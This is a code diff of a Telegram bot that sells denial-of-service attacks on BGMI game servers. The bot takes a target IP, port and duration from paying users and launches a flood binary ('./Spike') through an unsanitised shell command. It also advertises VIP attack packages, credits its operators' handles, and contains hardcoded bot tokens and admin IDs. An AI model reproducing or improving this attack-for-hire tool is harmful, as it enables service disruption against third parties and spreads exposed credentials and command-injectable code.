@@ -7,10 +7,10 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7256838089:AAGCSU4HxELNv2paap56sFKVmR2Be4dJMgI')
+bot = telebot.TeleBot('7562446506:AAGZ70yeFtTQ1LC0S3Yj8BqF22kQPwS41Rs')
 
 # Admin user IDs
-admin_id = ["5993665056"]
+admin_id = ["7116439045"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -246,7 +246,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./spyther {target} {port} {time} 900"
+                full_command = f"./Spike {target} {port} {time} 50 1000"
                 subprocess.run(full_command, shell=True)
                 response = f"💎 𝐃𝐄𝐀𝐑 PAID 𝐔𝐒𝐄𝐑 💎\n\n🛑 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 🛑\n\n⚙️ 𝐌𝐞𝐭𝐡𝐨𝐝 : PREMIUM\n\n📝 𝐀𝐝𝐯𝐢𝐜𝐞 :-\n📶 𝐘𝐨𝐮𝐫 𝐈𝐧𝐭𝐞𝐫𝐧𝐞𝐭 𝐈𝐬 𝐍𝐨𝐫𝐦𝐚𝐥 𝐍𝐨𝐰 𝐊𝐢𝐥𝐥 𝐀𝐥𝐥 𝐓𝐡𝐞 𝐏𝐥𝐚𝐲𝐞𝐫'𝐬 𝐀𝐧𝐝 𝐆𝐢𝐯𝐞 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤𝐬 𝐈𝐧 𝐂𝐡𝐚𝐭 𝐆𝐫𝐨𝐮𝐩 AND TO @TREXVIVEK"
         else:
@@ -326,7 +326,7 @@ def welcome_plan(message):
 
 🌟✨ <b>VIP Package Details</b> ✨🌟
 
-🕒 <b>Attack Time:</b> 280 seconds  
+🕒 <b>Attack Time:</b> 240 seconds  
 ⏳ <b>After Attack Limit:</b> 0 seconds  
 ⚔️ <b>Concurrent Attacks:</b> 3  
 
@@ -342,7 +342,7 @@ def welcome_plan(message):
 ---
 
 🚀 <b>Join Us for More!</b>  
-📩 <a href="https://t.me/+E376k1R35Xk3ZjA1">Contact Owner</a> 💥
+📩 <a href="na">Contact Owner</a> 💥
 '''
 
     bot.reply_to(message, response, parse_mode='HTML', reply_markup=get_inline_keyboard())
@@ -358,7 +358,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By @TREXVIVEK BOT
+By @xD_Rajveer BOT
 '''
     bot.reply_to(message, response, reply_markup=get_inline_keyboard())
 
